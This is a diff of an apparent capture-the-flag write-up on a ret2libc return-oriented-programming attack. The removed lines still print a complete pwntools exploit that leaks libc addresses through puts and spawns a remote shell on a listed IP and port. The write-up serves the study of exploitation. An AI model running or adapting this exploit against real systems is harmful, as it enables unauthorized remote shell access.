@@ -662,42 +662,7 @@ binsh = next(libc.search(b'/bin/sh')) + 25
 
 That why we have to put `- 64`.
 
-#### exploit.py
-```py
-from pwn import *
+This the final [exploit](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2libc/exploit.py).
 
-elf = context.binary = ELF('./ropme')
-p = remote('157.245.35.236', 32333)
-
-libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")
-rop = ROP(elf)
-
-offset = b'A' * 0x48
-puts_plt = elf.plt['puts']
-main_plt = elf.symbols['main']
-pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
-ret = (rop.find_gadget(['ret']))[0]
-log.info("Address of Main is:" + hex(main_plt))
-log.info("Address of puts@plt:" + hex(puts_plt))
-log.info("The gadget pop rdi; ret found at:" + hex(pop_rdi))
-
-puts_got = elf.got['puts']
-log.info("Address of puts@got:" + hex(puts_got))
-payload = offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_plt)
-p.clean()
-p.sendline(payload)
-leak_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
-log.info("Function puts leaked:" + hex(leak_puts))
-libc.address = leak_puts - libc.symbols['puts']
-log.info("Libc base %s" % hex(libc.address))
-
-# shell
-system = libc.sym['system']
-bin_sh = next(libc.search(b'/bin/sh')) - 64
-final_payload = offset + p64(pop_rdi) + p64(bin_sh) + p64(system)
-p.clean()
-p.sendline(final_payload)
-p.interactive()
-```
 
 ![image](https://user-images.githubusercontent.com/87600765/175791791-b7f3dfbd-111f-4d1b-bace-1de8fef3f570.png)
